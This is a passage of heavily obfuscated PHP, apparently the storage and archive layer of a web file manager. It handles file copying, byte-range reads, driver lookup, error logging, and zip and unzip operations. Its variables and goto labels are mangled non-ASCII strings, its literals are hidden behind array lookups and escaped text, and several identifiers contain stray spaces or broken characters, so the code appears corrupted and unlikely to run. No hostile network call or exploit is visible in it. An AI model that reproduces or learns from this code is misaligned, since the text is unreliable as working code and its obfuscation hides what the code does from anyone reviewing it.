($EƒÂ•Š©¼Û == count($E¯ğ®ë·Ù) - 1 && $BÖœ––ğË > $E¯ğ®ë·Ù[$EƒÂ•Š©¼Û]) { $BÖœ––ğË = $E¯ğ®ë·Ù[$EƒÂ•Š©¼Û]; break; } } } } $d›ÜæíåáÛ = self::driverMake($C»È’à˜¬Ø); if ($d›ÜæíåáÛ->isFileOutServer()) { return $d›ÜæíåáÛ->fileOutImageServer($C»È’à˜¬Ø, $BÖœ––ğË); } return $d›ÜæíåáÛ->fileOutImage($C»È’à˜¬Ø, $BÖœ––ğË); } private static function driverIsSame($d•òÅÑÊËñ, $d¿ÚñË½Ğğ) { goto eÊ‘…«Á —; eÊ‘…«Á —: $aÚ©öŠ‡ê =& $_SERVER[Š‰]; $Eª¼Ù‡Õ† = $d•òÅÑÊËñ->getType(); $dÉÒÁ©ÖĞ = $d¿ÚñË½Ğğ->getType(); goto FëŒëÂÉŸğ; eåë„°èø®: if ($d•òÅÑÊËñ->pathDriver == $d¿ÚñË½Ğğ->pathDriver) { return !0; } return !1; goto e”²ŞÛÓ¿Ô; FëŒëÂÉŸğ: if ($Eª¼Ù‡Õ† != $dÉÒÁ©ÖĞ) { return !1; } if ($Eª¼Ù‡Õ† == $aÚ©öŠ‡ê[707]) { return !0; } if ($Eª¼Ù‡Õ† == $aÚ©öŠ‡ê[105]) { return !0; } goto eåë„°èø®; e”²ŞÛÓ¿Ô: } public static function copyUpdate($Déò¼º¡Õô, $A¦†»‚ª»š) { goto c™Çø¶êŒ; bÑõ‚ÀÈ: $E¢æÕ‡ù¸ = self::_listAll($Déò¼º¡Õô); $A•µÀô¨ = self::_listAll($A¦†»‚ª»š); $cÀùÌë„êİ = array(); goto bšìäÒ¯¿Ğ; c™Çø¶êŒ: $c’ÚµÕ‡§æ =& $_SERVER[Š‰]; if (!IO::exist($Déò¼º¡Õô)) { return !1; } if (!IO::exist($A¦†»‚ª»š)) { IO::mkdir($A¦†»‚ª»š); } goto bÑõ‚ÀÈ; bæŒè½‰‘: Hook::trigger($c’ÚµÕ‡§æ[1034], $Déò¼º¡Õô, $A¦†»‚ª»š, $D“ØÊ³Ù„); foreach ($b„À¾êùÔ as $AâìŒİù“ƒ) { IO::mkdir($AâìŒİù“ƒ); } foreach ($cÀùÌë„êİ as $AâìŒİù“ƒ) { IO::copy($AâìŒİù“ƒ[$c’ÚµÕ‡§æ[1031]], $AâìŒİù“ƒ[$c’ÚµÕ‡§æ[1032]], REPEAT_REPLACE); } goto b»²ö¸Á½ä; bšìäÒ¯¿Ğ: $b„À¾êùÔ = array(); foreach ($E¢æÕ‡ù¸ as $DË¿å¥¯òø => $AâìŒİù“ƒ) { if (isset($A•µÀô¨[$DË¿å¥¯òø])) { if ($AâìŒİù“ƒ[$c’ÚµÕ‡§æ[76]] == 1) { continue; } if ($A•µÀô¨[$DË¿å¥¯òø][$c’ÚµÕ‡§æ[77]] == $AâìŒİù“ƒ[$c’ÚµÕ‡§æ[77]]) { continue; } } if ($AâìŒİù“ƒ[$c’ÚµÕ‡§æ[76]] == 1) { $b„À¾êùÔ[] = $A¦†»‚ª»š . $c’ÚµÕ‡§æ[8] . $DË¿å¥¯òø; continue; } $fÁåœñÀ»“ = strstr(trim($DË¿å¥¯òø, $c’ÚµÕ‡§æ[8]), $c’ÚµÕ‡§æ[8]) ? get_path_father($DË¿å¥¯òø) : $c’ÚµÕ‡§æ[33]; $cÀùÌë„êİ[] = array($c’ÚµÕ‡§æ[1031] => $AâìŒİù“ƒ[$c’ÚµÕ‡§æ[75]], $c’ÚµÕ‡§æ[1032] => rtrim($A¦†»‚ª»š, $c’ÚµÕ‡§æ[8]) . $c’ÚµÕ‡§æ[8] . $fÁåœñÀ»“, $c’ÚµÕ‡§æ[1033] => $AâìŒİù“ƒ); } $D“ØÊ³Ù„ = array($c’ÚµÕ‡§æ[173] => $cÀùÌë„êİ, $c’ÚµÕ‡§æ[76] => $b„À¾êùÔ); goto bæŒè½‰‘; b»²ö¸Á½ä: } private static function _listAll($cî‹®Û®˜×) { $b©‘ó³¹š± =& $_SERVER[Š‰]; $cî‹®Û®˜× = KodIO::clear($cî‹®Û®˜×); $cæºï°¶¤ = IO::listAll($cî‹®Û®˜×); foreach ($cæºï°¶¤ as &$CÜİ¾à˜ç³) { $e…›³÷Í¥Û = substr($CÜİ¾à˜ç³[$b©‘ó³¹š±[75]], strlen($cî‹®Û®˜×)); $CÜİ¾à˜ç³[$b©‘ó³¹š±[1035]] = trim($e…›³÷Í¥Û, $b©‘ó³¹š±[8]); } unset($CÜİ¾à˜ç³); return array_to_keyvalue($cæºï°¶¤, $b©‘ó³¹š±[1035]); } public static function fileSubstr($cƒâíé¦, $e¯‘‰ÍÊìî, $e‹×Ã±õ”¯ = false) { goto b®Óø‹ØË³; eê¾µÙØÖ£: if ($e‹×Ã±õ”¯ <= 0) { return $dÓ·‡Ä¼—•[33]; } if ($e¯‘‰ÍÊìî < 0 || $e¯‘‰ÍÊìî >= $e®ÌÚ¬²Â || $e‹×Ã±õ”¯ > 1024 * 1024 * 5) { throw new Exception("\x66\151\x6c\x65\x52\x65\x61\x64\x20\145\162\x72\x6f\x72\x21\40\163\164\141\x72\164\75{$e¯‘‰ÍÊìî}\x3b\x6c\x65\156\147\164\x68\75{$e‹×Ã±õ”¯}\73\40\163\x69\x7a\145\x3d{$e®ÌÚ¬²Â}\x3b"); } $a‹ù¿ˆŒ–õ = $e†¢’¾ÌãÛ->fileSubstr($cƒâíé¦, $e¯‘‰ÍÊìî, $e‹×Ã±õ”¯); goto a™‡—‹ÂÛ; AÈÔ¡¹§ô : $C•Âí÷§í = $e¯‘‰ÍÊìî; $BÁòéã†ŒÖ = $e‹×Ã±õ”¯; if ($e¯‘‰ÍÊìî < 0) { $e¯‘‰ÍÊìî = $e®ÌÚ¬²Â + $e¯‘‰ÍÊìî; } goto cä™—–ğº‡; a™‡—‹ÂÛ: if (!$a‹ù¿ˆŒ–õ && $e‹×Ã±õ”¯ && isset($GLOBALS[$dÓ·‡Ä¼—•[1038]])) { throw new Exception($GLOBALS[$dÓ·‡Ä¼—•[1038]][$dÓ·‡Ä¼—•[1039]]); } return $a‹ù¿ˆŒ–õ; goto aµºéÍÊÀ; b®Óø‹ØË³: $dÓ·‡Ä¼—• =& $_SERVER[Š‰]; $e†¢’¾ÌãÛ = self::driverMake($cƒâíé¦); $e®ÌÚ¬²Â = $e†¢’¾ÌãÛ->size($cƒâíé¦); goto AÈÔ¡¹§ô ; cä™—–ğº‡: if ($e‹×Ã±õ”¯ === !1) { $e‹×Ã±õ”¯ = $e®ÌÚ¬²Â - $e¯‘‰ÍÊìî; } if ($e¯‘‰ÍÊìî + $e‹×Ã±õ”¯ > $e®ÌÚ¬²Â) { $e‹×Ã±õ”¯ = $e®ÌÚ¬²Â - $e¯‘‰ÍÊìî; } if (!$e®ÌÚ¬²Â && $e†¢’¾ÌãÛ->getType() == $dÓ·‡Ä¼—•[105] && !$e†¢’¾ÌãÛ->exist($cƒâíé¦)) { throw new Exception($dÓ·‡Ä¼—•[1036] . LNG($dÓ·‡Ä¼—•[1037]) . $dÓ·‡Ä¼—•[901] . get_path_this($cƒâíé¦) . $dÓ·‡Ä¼—•[33]); } goto eê¾µÙØÖ£; aµºéÍÊÀ: } private static function driverMake(&$A¹´ÕíùÍ) { goto FÙ¡‘å…Ü´; FÙ¡‘å…Ü´: $E¬–÷ï¥À¬ =& $_SERVER[Š‰]; $aÈàóÀ¡í = KodIO::parse($A¹´ÕíùÍ); if (!self::$driverListSystem) { $bÌÃ‡ˆŸÁ = Model($E¬–÷ï¥À¬[716])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($bÌÃ‡ˆŸÁ, $E¬–÷ï¥À¬[388]); } goto BÍÀ°‰½Ë‡; BÍÀ°‰½Ë‡: if ($aÈàóÀ¡í[$E¬–÷ï¥À¬[29]] == KodIO::KOD_IO && !self::$driverListSystem[$aÈàóÀ¡í[$E¬–÷ï¥À¬[388]]]) { return !1; } $A¹´ÕíùÍ = $aÈàóÀ¡í[$E¬–÷ï¥À¬[1040]]; $cÕİ¾Ã£Æ = self::driverGet($aÈàóÀ¡í, $A¹´ÕíùÍ); goto a˜†ÖÃğéÉ; a˜†ÖÃğéÉ: return $cÕİ¾Ã£Æ; goto CĞõê„ÑŞ„; CĞõê„ÑŞ„: } private static function driverGet($c–·¼öˆ®è, &$F¥ƒÌÀóÀ) { goto c÷‹÷ÕÚ; fÌ™“æ¸Ó: $c‚‹ôº†Ôî->path = $F¥ƒÌÀóÀ; return $c‚‹ôº†Ôî; goto a°Üš¦Ñ´; fï²Ñ¬Ùö‚: $c‚‹ôº†Ôî = self::$driverCache[$FÅ‰¹´]; $c‚‹ôº†Ôî->pathDriver = $D„¨‹½×£; $c‚‹ôº†Ôî->pathBase = $f¼ïª¤ŸÜ[33]; goto BËµ ƒ”“ë; BÑŞçøÑö: switch ($c–·¼öˆ®è[$f¼ïª¤ŸÜ[29]]) { case KodIO::KOD_IO: $B  Ì‚Øç = self::$driverListSystem[$B÷ì¡ñ²ë]; break; case KodIO::KOD_SOURCE: $F¥ƒÌÀóÀ = $B÷ì¡ñ²ë . $F¥ƒÌÀóÀ; $B  Ì‚Øç = array($f¼ïª¤ŸÜ[1042] => $f¼ïª¤ŸÜ[1043], $f¼ïª¤ŸÜ[6] => $c–·¼öˆ®è); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $DŠçÖ©ê˜Œ = $GLOBALS[$f¼ïª¤ŸÜ[1044]]; self::$driverListUser = array_to_keyvalue($DŠçÖ©ê˜Œ, $f¼ïª¤ŸÜ[388]); } $B  Ì‚Øç = self::$driverListUser[$B÷ì¡ñ²ë]; break; case KodIO::KOD_SHARE_LINK: $B  Ì‚Øç = array($f¼ïª¤ŸÜ[1042] => $f¼ïª¤ŸÜ[1045], $f¼ïª¤ŸÜ[6] => $c–·¼öˆ®è); $Dì·’ã¹¯¸ = Action($f¼ïª¤ŸÜ[1046])->sharePathInfo($c–·¼öˆ®è[$f¼ïª¤ŸÜ[75]]); $F¥ƒÌÀóÀ = $Dì·’ã¹¯¸[$f¼ïª¤ŸÜ[390]]; if (!$Dì·’ã¹¯¸[$f¼ïª¤ŸÜ[390]]) { $cÌóµ²ßğ = Model($f¼ïª¤ŸÜ[558])->getInfo($Dì·’ã¹¯¸[$f¼ïª¤ŸÜ[462]]); $F¥ƒÌÀóÀ = KodIO::clear($cÌóµ²ßğ[$f¼ïª¤ŸÜ[1047]] . $c–·¼öˆ®è[$f¼ïª¤ŸÜ[1040]]); $c–·¼öˆ®è[$f¼ïª¤ŸÜ[460]] = $cÌóµ²ßğ; $c–·¼öˆ®è[$f¼ïª¤ŸÜ[1024]] = $F¥ƒÌÀóÀ; $B  Ì‚Øç = array($f¼ïª¤ŸÜ[1042] => $f¼ïª¤ŸÜ[1048], $f¼ïª¤ŸÜ[6] => $c–·¼öˆ®è); } break; case KodIO::KOD_SHARE_ITEM: $B  Ì‚Øç = array($f¼ïª¤ŸÜ[1042] => $f¼ïª¤ŸÜ[1049], $f¼ïª¤ŸÜ[6] => $c–·¼öˆ®è); $cÌóµ²ßğ = Model($f¼ïª¤ŸÜ[558])->getInfo($c–·¼öˆ®è[$f¼ïª¤ŸÜ[388]]); if ($cÌóµ²ßğ[$f¼ïª¤ŸÜ[390]] == $f¼ïª¤ŸÜ[491]) { $F¥ƒÌÀóÀ = KodIO::clear($cÌóµ²ßğ[$f¼ïª¤ŸÜ[1047]] . $c–·¼öˆ®è[$f¼ïª¤ŸÜ[1040]]); $c–·¼öˆ®è[$f¼ïª¤ŸÜ[460]] = $cÌóµ²ßğ; $c–·¼öˆ®è[$f¼ïª¤ŸÜ[1024]] = $F¥ƒÌÀóÀ; $B  Ì‚Øç = array($f¼ïª¤ŸÜ[1042] => $f¼ïª¤ŸÜ[1050], $f¼ïª¤ŸÜ[6] => $c–·¼öˆ®è); } else { if (!$F¥ƒÌÀóÀ) { $F¥ƒÌÀóÀ = $cÌóµ²ßğ[$f¼ïª¤ŸÜ[390]]; } } break; default: $F¥ƒÌÀóÀ = $c–·¼öˆ®è[$f¼ïª¤ŸÜ[75]]; $B  Ì‚Øç = array($f¼ïª¤ŸÜ[1042] => $f¼ïª¤ŸÜ[1051]); break; } $FÅ‰¹´ = $c–·¼öˆ®è[$f¼ïª¤ŸÜ[75]]; if (!isset(self::$driverCache[$FÅ‰¹´])) { $Dàöá¯‰Š‘ = strtolower($B  Ì‚Øç[$f¼ïª¤ŸÜ[93]]); $f¨òŠÇ©» = $GLOBALS[$f¼ïª¤ŸÜ[6]][$f¼ïª¤ŸÜ[87]][$f¼ïª¤ŸÜ[776]]; $Bá’›³”•¶ = $f¼ïª¤ŸÜ[71] . (isset($f¨òŠÇ©»[$Dàöá¯‰Š‘]) ? $f¨òŠÇ©»[$Dàöá¯‰Š‘] : ucfirst($Dàöá¯‰Š‘)); if (!class_exists($Bá’›³”•¶)) { show_json("{$Bá’›³”•¶}\40\156\157\164\40\145\x78\151\x73\x74\163\x21", !1); } $D‡£’×ˆ½¥ = isset($B  Ì‚Øç[$f¼ïª¤ŸÜ[6]]) ? $B  Ì‚Øç[$f¼ïª¤ŸÜ[6]] : !1; self::$driverCache[$FÅ‰¹´] = new $Bá’›³”•¶($D‡£’×ˆ½¥); } goto fï²Ñ¬Ùö‚; c÷‹÷ÕÚ: $f¼ïª¤ŸÜ =& $_SERVER[Š‰]; $D„¨‹½×£ = $c–·¼öˆ®è[$f¼ïª¤ŸÜ[1041]]; $B÷ì¡ñ²ë = $c–·¼öˆ®è[$f¼ïª¤ŸÜ[388]]; goto BÑŞçøÑö; BËµ ƒ”“ë: if (isset($B  Ì‚Øç[$f¼ïª¤ŸÜ[6]][$f¼ïª¤ŸÜ[1052]])) { $c‚‹ôº†Ôî->pathBase = rtrim($B  Ì‚Øç[$f¼ïª¤ŸÜ[6]][$f¼ïª¤ŸÜ[1052]], $f¼ïª¤ŸÜ[8]) . $f¼ïª¤ŸÜ[8]; $F¥ƒÌÀóÀ = $c‚‹ôº†Ôî->pathBase . ltrim($F¥ƒÌÀóÀ, $f¼ïª¤ŸÜ[8]); } $F¥ƒÌÀóÀ = $c‚‹ôº†Ôî->getPath($F¥ƒÌÀóÀ); if (isset($c–·¼öˆ®è[$f¼ïª¤ŸÜ[1024]])) { $F¥ƒÌÀóÀ = $c–·¼öˆ®è[$f¼ïª¤ŸÜ[1024]]; } goto fÌ™“æ¸Ó; a°Üš¦Ñ´: } public static function errorTips($e¶¾äõóºª = false) { goto c˜íáİö®ò; AÈä¿ë£µ: $cÜ¥÷­˜Ê[] = $e¶¾äõóºª; write_log($D›‰«¹ã´Ø[159] . ACTION . $D›‰«¹ã´Ø[1053] . $e¶¾äõóºª, $D›‰«¹ã´Ø[1054]); goto EÕäƒß ±Æ; D®™å´î•: if ($e¶¾äõóºª === -1) { return $cÜ¥÷­˜Ê ? $cÜ¥÷­˜Ê[count($cÜ¥÷­˜Ê) - 1] : $D›‰«¹ã´Ø[33]; } if ($e¶¾äõóºª === !1) { return implode($D›‰«¹ã´Ø[227], $cÜ¥÷­˜Ê); } if (count($cÜ¥÷­˜Ê) >= $Fì°ùãøŠ) { $cÜ¥÷­˜Ê = array_slice($cÜ¥÷­˜Ê, $Fì°ùãøŠ * 0.5, $Fì°ùãøŠ); } goto AÈä¿ë£µ; c˜íáİö®ò: $D›‰«¹ã´Ø =& $_SERVER[Š‰]; static $cÜ¥÷­˜Ê = array(); $Fì°ùãøŠ = 1000; goto D®™å´î•; EÕäƒß ±Æ: } public static function getLastError($eïÌ±Ø›íÇ = '') { $dç´´¡˜Ó = self::errorTips(-1); return $dç´´¡˜Ó ? $dç´´¡˜Ó : $eïÌ±Ø›íÇ; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $AòĞÍóø¶; if (!$AòĞÍóø¶) { $b—´ŠË¼ = IO::init($_SERVER[Š‰][8]); } return $b—´ŠË¼; } private static function iconvSystem($a¡—ø İ˜ ) { return self::local()->iconvSystem($a¡—ø İ˜ ); } private static function iconvApp($CÉ–É­óßÍ) { return self::local()->iconvApp($CÉ–É­óßÍ); } public static function zip($aì”’â‘ñ„, $a„ïõ¡ùâ = "\172\151\x70", $dÁåä®Óİ = '', $BçŠÃ‰¢Ğã = REPEAT_RENAME) { goto C¬–Øç«ŠÃ; b±ª±’¬õ¬: if (count($eÉá†»÷éø) > 1) { $C¿‹­ ĞÁô = IO::info(IO::pathFather($bÛ»êøªò‹[$D¶„ê›éóÖ[75]])); $d¹Ñ«¥ÏÌ  = $C¿‹­ ĞÁô[$D¶„ê›éóÖ[28]]; } $b¨õƒÊ¯É„ = $D‚¿£¿¶ºë; if (!$b¨õƒÊ¯É„) { $b¨õƒÊ¯É„ = get_path_father($bÛ»êøªò‹[$D¶„ê›éóÖ[75]]); if (!$dÁåä®Óİ && $Cç¯ğ´ñõ->getType() == $D¶„ê›éóÖ[105]) { $b¨õƒÊ¯É„ = get_path_father($Cç¯ğ´ñõ->path); } $Eì¯‚à‘¥ = IO::info($b¨õƒÊ¯É„); if (!$Eì¯‚à‘¥[$D¶„ê›éóÖ[194]]) { show_json(LNG($D¶„ê›éóÖ[1056]), !1); } } goto Aò¥î©…—×; C¬–Øç«ŠÃ: $D¶„ê›éóÖ =& $_SERVER[Š‰]; $Cç¯ğ´ñõ = self::init($aì”’â‘ñ„[0][$D¶„ê›éóÖ[75]]); $bÛ»êøªò‹ = self::info($aì”’â‘ñ„[0][$D¶„ê›éóÖ[75]]); goto b²ğòø¿‹; b²ğòø¿‹: $D‚¿£¿¶ºë = !1; if (!$dÁåä®Óİ && $Cç¯ğ´ñõ->getType() == $D¶„ê›éóÖ[105]) { $eÉá†»÷éø = self::zipFileList($aì”’â‘ñ„); } else { $D‚¿£¿¶ºë = $dÁåä®Óİ ? $dÁåä®Óİ : TEMP_FILES . $D¶„ê›éóÖ[1055] . time() . rand_string(8) . $D¶„ê›éóÖ[8]; mk_dir($D‚¿£¿¶ºë); $eÉá†»÷éø = self::zipFileList($aì”’â‘ñ„, $D‚¿£¿¶ºë); } $d¹Ñ«¥ÏÌ  = $bÛ»êøªò‹[$D¶„ê›éóÖ[28]]; goto b±ª±’¬õ¬; bº³ñŠ¾ÀÛ: foreach ($eÉá†»÷éø as $A˜»¹é†£ì => $câ¶ÁÉ¾òÜ) { $eÉá†»÷éø[$A˜»¹é†£ì] = self::iconvSystem($câ¶ÁÉ¾òÜ); } KodArchive::create($EŞÊÂ’‰Ú, $eÉá†»÷éø); if (!IO::exist($Fë¾’Œ¥óº)) { if ($D‚¿£¿¶ºë) { del_dir($D‚¿£¿¶ºë); } show_json(LNG($D¶„ê›éóÖ[1057]), !1); } goto E™ÚŒÏ³×Ï; FÆ¦¿ÀÄ‘µ: if (!$aæºÅ»ˆòí) { del_dir($D‚¿£¿¶ºë); show_json(LNG($D¶„ê›éóÖ[1057]), !1); } del_dir($D‚¿£¿¶ºë); return $aæºÅ»ˆòí; goto a×»ÁİãÃŒ; Aò¥î©…—×: $Fë¾’Œ¥óº = $b¨õƒÊ¯É„ . $d¹Ñ«¥ÏÌ  . $D¶„ê›éóÖ[94] . $a„ïõ¡ùâ; $Fë¾’Œ¥óº = get_filename_auto($Fë¾’Œ¥óº, $D¶„ê›éóÖ[33], $BçŠÃ‰¢Ğã); $EŞÊÂ’‰Ú = self::iconvSystem($Fë¾’Œ¥óº); goto bº³ñŠ¾ÀÛ; E™ÚŒÏ³×Ï: if ($dÁåä®Óİ || !$D‚¿£¿¶ºë) { if ($D‚¿£¿¶ºë && strstr($D‚¿£¿¶ºë, TEMP_FILES)) { $e¥Ü˜ˆ º² = $eÉá†»÷éø = array(); recursion_dir($b¨õƒÊ¯É„, $e¥Ü˜ˆ º², $eÉá†»÷éø, 0); foreach ($e¥Ü˜ˆ º² as $E°£¢ÁŸÈé) { del_dir($E°£¢ÁŸÈé); } foreach ($eÉá†»÷éø as $C…õÚåŒ£) { if ($C…õÚåŒ£ == $EŞÊÂ’‰Ú) { continue; } del_file($C…õÚåŒ£); } } return $Fë¾’Œ¥óº; } $b‡Š¥Õ°ÕÚ = self::pathFather($bÛ»êøªò‹[$D¶„ê›éóÖ[75]]); $aæºÅ»ˆòí = self::move($Fë¾’Œ¥óº, $b‡Š¥Õ°ÕÚ, $BçŠÃ‰¢Ğã); goto FÆ¦¿ÀÄ‘µ; a×»ÁİãÃŒ: } public static function unzip($EÂµÎ“ñˆ¯, $EŸøíĞ±ÃÊ = "\x72\x65\160\x6c\x61\x63\x65") { goto CÓ¢¢Ï®›«; FªØ¡¹³Â: if (!@file_exists(self::iconvSystem($C»– Ç–¢))) { $f’±ê†¦Ÿ¨ = self::localFilePath($E‘ìñ„‘‡, $F…œñÌé°); $C»– Ç–¢ = $f’±ê†¦Ÿ¨ ? $f’±ê†¦Ÿ¨ : parent::download($E‘ìñ„‘‡, $C»– Ç–¢); } $C»– Ç–¢ = self::iconvSystem($C»– Ç–¢); $AöÑ“Ö‘Ğ = isset($EÂµÎ“ñˆ¯[$cŒÓã¢­Á‚[1060]]) ? $EÂµÎ“ñˆ¯[$cŒÓã¢­Á‚[1060]] : $cŒÓã¢­Á‚[1061]; goto BˆĞ°¼ê¡¯; AÏ¦Æ×½Áë: return !0; goto EØ™İˆ¯Á; BˆĞ°¼ê¡¯: $c½·íµœÂÒ = KodArchive::extract($C»– Ç–¢, $E¸½—‘øÀà . $cŒÓã¢­Á‚[8], $AöÑ“Ö‘Ğ); self::archiveExt(); if (!$c½·íµœÂÒ[$cŒÓã¢­Á‚[1062]]) { show_json($cŒÓã¢­Á‚[1063] . $c½·íµœÂÒ[$cŒÓã¢­Á‚[1064]], !1); } goto aáÌ‰ÃÊÜ; CÓ¢¢Ï®›«: $cŒÓã¢­Á‚ =& $_SERVER[Š‰]; $E‘ìñ„‘‡ = $EÂµÎ“ñˆ¯[$cŒÓã¢­Á‚[75]]; $DŞ’î²­¨ = $EÂµÎ“ñˆ¯[$cŒÓã¢­Á‚[1058]]; goto EÏÇ„Šßªì; D¨ƒÀ¾øº: mk_dir($E¸½—‘øÀà); $F…œñÌé° = self::fileExt($EÙ†Çæé³”); $C»– Ç–¢ = $E¸½—‘øÀà . $cŒÓã¢­Á‚[94] . $F…œñÌé°; goto FªØ¡¹³Â; c…¤–·Ö‡Å: foreach ($bàŸÖ™âæŠ as $a¤Ê…‚³«Ğ) { $a¤Ê…‚³«Ğ = self::iconvApp($a¤Ê…‚³«Ğ); self::move($a¤Ê…‚³«Ğ, $DŞ’î²­¨, $EŸøíĞ±ÃÊ); } del_dir($E¸½—‘øÀà); if (!$f’±ê†¦Ÿ¨) { del_file($C»– Ç–¢); } goto AÏ¦Æ×½Áë; EÏÇ„Šßªì: if (!($EÙ†Çæé³” = parent::info($E‘ìñ„‘‡))) { show_json(LNG($cŒÓã¢­Á‚[1059]), !1); } if (!($cĞªÅŒ—Ëß = parent::infoFull($DŞ’î²­¨))) { $DŞ’î²­¨ = parent::mkdir($DŞ’î²­¨); $cĞªÅŒ—Ëß = array($cŒÓã¢­Á‚[75] => $DŞ’î²­¨); } else { if (isset($cĞªÅŒ—Ëß[$cŒÓã¢­Á‚[390]]) && trim($cĞªÅŒ—Ëß[$cŒÓã¢­Á‚[75]], $cŒÓã¢­Á‚[8]) != trim($DŞ’î²­¨, $cŒÓã¢­Á‚[8])) { $Eî³ÅÅš¬ = KodIO::make($cĞªÅŒ—Ëß[$cŒÓã¢­Á‚[472]]); $eÂê»Ä¼¤Ü = parent::fileNameAuto($Eî³ÅÅš¬, $cĞªÅŒ—Ëß[$cŒÓã¢­Á‚[28]], REPEAT_RENAME_FOLDER, !0); $DŞ’î²­¨ = parent::mkdir($Eî³ÅÅš¬ . $eÂê»Ä¼¤Ü); $cĞªÅŒ—Ëß = array($cŒÓã¢­Á‚[75] => $DŞ’î²­¨); } } $DŞ’î²­¨ = $cĞªÅŒ—Ëß[$cŒÓã¢­Á‚[75]]; goto dƒ™×¤ò‚Ä; dƒ™×¤ò‚Ä: $dİ«›‡¦ = self::tmpFileName($EÙ†Çæé³”); $E¸½—‘øÀà = TEMP_FILES . $dİ«›‡¦; del_dir($E¸½—‘øÀà); goto D¨ƒÀ¾øº; aáÌ‰ÃÊÜ: Hook::trigger($cŒÓã¢­Á‚[1065], $E¸½—‘øÀà); recursion_dir($E¸½—‘øÀà, $c¨™³‡Ô‚„, $FÑ†…øõùÉ, 0); $bàŸÖ™âæŠ = array_merge($c¨™³‡Ô‚„, $FÑ†…øõùÉ); goto c…¤–·Ö‡Å; EØ™İˆ¯Á: } public static function unzipList($c†’ÏÎ˜¹å) { goto Eİ¬´„†Ûæ; BÎÃ®¤óİ: $aí‘ŞÇ÷³ä = self::iconvSystem($aí‘ŞÇ÷³ä); if ($d¦ïá¡ŒÛ >= 0) { $Aø×ø´…áå = isset($c†’ÏÎ˜¹å[$A“óÉ¬šö[1070]]) ? $c†’ÏÎ˜¹å[$A“óÉ¬šö[1070]] : !1; $c¨µæíÙ»ì = isset($c†’ÏÎ˜¹å[$A“óÉ¬šö[28]]) ? $c†’ÏÎ˜¹å[$A“óÉ¬šö[28]] : $A“óÉ¬šö[33]; KodArchive::filePreview($aí‘ŞÇ÷³ä, $d¦ïá¡ŒÛ, $Aø×ø´…áå, $c¨µæíÙ»ì); self::archiveExt(); die; } $b¨¸µ‘¦Á÷ = KodArchive::listContent($aí‘ŞÇ÷³ä); goto eğÌ›İŠ½; cÙœ¹“á÷·: return $b¨¸µ‘¦Á÷[$A“óÉ¬šö[1064]]; goto E‘Éê‹Š‰; dí¥…¼î‹Ş: $CŸ¼É×Ÿ½ò = 50000; if (request_url_safe($fÚÉ­Áù¾)) { $Bäêå·ìœî = parse_url_query($fÚÉ­Áù¾); if (!isset($Bäêå·ìœî[$A“óÉ¬šö[75]])) { show_json($A“óÉ¬šö[1067], !1); } } $bÚÍ‹£ƒÍ§ = isset($Bäêå·ìœî) ? $Bäêå·ìœî[$A“óÉ¬šö[75]] : $fÚÉ­Áù¾; goto F†ùŒù¬…ô; CéÙ‘¡ÊË: if (!is_dir($cëôŠ £ï)) { mk_dir($cëôŠ £ï); } $aí‘ŞÇ÷³ä = $cëôŠ £ï . $A“óÉ¬šö[8] . $cõ½ËÓš›½; if (!@file_exists(self::iconvSystem($aí‘ŞÇ÷³ä))) { if (isset($Bäêå·ìœî)) { url_request($fÚÉ­Áù¾, $A“óÉ¬šö[1069], $aí‘ŞÇ÷³ä); } else { $a¸¼ÓÁøæ“ = self::localFilePath($fÚÉ­Áù¾, $FäæøÈÉ); $aí‘ŞÇ÷³ä = $a¸¼ÓÁøæ“ ? $a¸¼ÓÁøæ“ : self::download($fÚÉ­Áù¾, $aí‘ŞÇ÷³ä); } } goto BÎÃ®¤óİ; Dè‹ˆˆ÷Ó: $F©Û¼ìòÑ = json_encode($b¨¸µ‘¦Á÷[$A“óÉ¬šö[1064]]); self::setContent($bë¸›ªÒãß, $F©Û¼ìòÑ); if (count($b¨¸µ‘¦Á÷[$A“óÉ¬šö[1064]]) >= $CŸ¼É×Ÿ½ò) { show_json(sprintf(LNG($A“óÉ¬šö[1068]), count($b¨¸µ‘¦Á÷[$A“óÉ¬šö[1064]])), !1); } goto cÙœ¹“á÷·; Eİ¬´„†Ûæ: $A“óÉ¬šö =& $_SERVER[Š‰]; $fÚÉ­Áù¾ = $c†’ÏÎ˜¹å[$A“óÉ¬šö[75]]; $d¦ïá¡ŒÛ = isset($c†’ÏÎ˜¹å[$A“óÉ¬šö[1066]]) ? $c†’ÏÎ˜¹å[$A“óÉ¬šö[1066]] : -1; goto dí¥…¼î‹Ş; D…À×¼²Ñ«: if (isset($Bäêå·ìœî)) { $E¸¾Äã‹² = array($Bäêå·ìœî[$A“óÉ¬šö[75]], $Bäêå·ìœî[$A“óÉ¬šö[1066]], $Bäêå·ìœî[$A“óÉ¬šö[28]]); $cõ½ËÓš›½ = md5(implode($A“óÉ¬šö[70], $E¸¾Äã‹²)) . $A“óÉ¬šö[94] . get_path_ext($Bäêå·ìœî[$A“óÉ¬šö[28]]); } else { $E¸¾Äã‹² = array($DÖ’‹ïæÀˆ[$A“óÉ¬šö[28]], $DÖ’‹ïæÀˆ[$A“óÉ¬šö[75]], $DÖ’‹ïæÀˆ[$A“óÉ¬šö[77]]); $cõ½ËÓš›½ = md5(implode($A“óÉ¬šö[70], $E¸¾Äã‹²)) . $A“óÉ¬šö[94] . $FäæøÈÉ; } if ($d¦ïá¡ŒÛ == -1) { $bë¸›ªÒãß = IO_PATH_SYSTEM_TEMP . "\x7a\x69\160\126\x69\x65\x77\57{$D¦Äâ‰‹õö}\x2f{$cõ½ËÓš›½}\56\x6c\x6f\x67"; $c‡…‡Ñƒ‹Ë = self::infoFull($bë¸›ªÒãß); if ($c‡…‡Ñƒ‹Ë) { $bë¸›ªÒãß = $c‡…‡Ñƒ‹Ë[$A“óÉ¬šö[75]]; $F¦¬ö‚”Š« = self::getContent($bë¸›ªÒãß); if ($F¦¬ö‚”Š«) { $F©Û¼ìòÑ = json_decode($F¦¬ö‚”Š«, !0); if (count($F©Û¼ìòÑ) >= $CŸ¼É×Ÿ½ò) { show_json(sprintf(LNG($A“óÉ¬šö[1068]), count($F©Û¼ìòÑ)), !1); } return $F©Û¼ìòÑ; } } else { $bë¸›ªÒãß = self::mkfile($bë¸›ªÒãß); } } $cëôŠ £ï = TEMP_FILES . $D¦Äâ‰‹õö; goto CéÙ‘¡ÊË; eğÌ›İŠ½: self::archiveExt(); del_dir($cëôŠ £ï); if (!$b¨¸µ‘¦Á÷[$A“óÉ¬šö[1062]]) { 